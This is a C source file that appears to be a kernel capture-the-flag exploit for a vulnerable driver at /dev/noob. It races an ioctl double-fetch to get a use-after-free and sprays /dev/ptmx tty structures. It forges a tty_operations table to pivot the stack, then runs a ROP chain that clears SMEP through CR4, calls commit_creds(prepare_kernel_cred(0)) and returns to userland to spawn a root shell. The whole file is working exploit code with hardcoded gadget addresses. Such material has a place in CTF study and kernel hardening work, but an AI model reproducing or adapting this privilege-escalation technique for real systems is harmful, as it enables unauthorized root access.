#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mman.h>

struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("[+] status has been saved.");
}

void get_shell()
{
    system("/bin/sh");
}

size_t prepare_kernel_cred_addr = 0xffffffff810ad7e0, commit_creds_addr = 0xffffffff810ad430;
void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}

int change_flag = 1;
void change_value(size_t *ptr)
{
    while (change_flag)
        *ptr = 0x2e0;
}

void* fake_tty_operations[0x30];
size_t fake_tty_struct[4] = {0};
struct tty_operations fake_ops;
char fake_procfops[1024];
int spray_fd[0x100];
int main()
{
    save_status();
    
    int fd = open("/dev/noob", O_RDWR);
    pthread_t t1;
    size_t buf[3] = {0};
    pthread_create(&t1, NULL, change_value, &buf[2]);
    for (int i = 0; i < 0x100000; i++)
    {
        buf[2] = 0;
        ioctl(fd, 0x30000, buf);
    }
    change_flag = 0;
    pthread_join(t1, NULL);
    buf[0] = 0;
    ioctl(fd, 0x30001, buf);

    size_t xchg_eax_esp_ret = 0xffffffff8101db17, fake_stack = xchg_eax_esp_ret & 0xffffffff;
    if (mmap((void*)(fake_stack & 0xfffff000), 0x3000, 7, 0x22, -1, 0) != (fake_stack & 0xfffff000))
    {
        puts("[-] mmap error!");
        exit(0);
    }
    size_t rop[13] = {0};
    rop[0] = 0xffffffff813f6c9d;                    // pop rdi; ret;
    rop[1] = 0x6f0;
    rop[2] = 0xffffffff8101f2f0;                    // mov cr4, rdi; pop rbp; ret;
    rop[3] = 0;
    rop[4] = get_root;
    rop[5] = 0xffffffff81069bd4;                    // swapgs ; pop rbp ; ret
    rop[6] = 0x0;
    rop[7] = 0xffffffff81034edb,                    // iretq; pop rbp; ret;   后面不需要伪造rbp
    rop[8] = (size_t)get_shell;
    rop[9] = user_cs;
    rop[10] = user_rflags;
    rop[11] = user_sp;
    rop[12] = user_ss;
    memcpy((void*)fake_stack, rop, sizeof(rop));

    memset(&fake_ops, 0, sizeof(fake_ops));
    memset(fake_procfops, 0, sizeof(fake_procfops));
    fake_ops.proc_fops = &fake_procfops;
    fake_ops.ioctl = xchg_eax_esp_ret;

    size_t buf_e[4] = {0};
    for (int i = 0; i < 0x100; i++)
    {
        spray_fd[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
        if (spray_fd[i] < 0)
            puts("[-] open error!");
    }
    buf[0] = 0;
    buf[1] = buf_e;
    buf[2] = 0x20;
    ioctl(fd, 0x30003, buf);
    buf_e[3] = &fake_ops;
    for (int i = 0; i < 4; i++)
        printf("%llx\n", buf_e[i]);
    
    ioctl(fd, 0x30002, buf);
    for(int i =0 ; i < 0x100; i++){
        ioctl(spray_fd[i], 0, 0);
    }

    return 0;
}
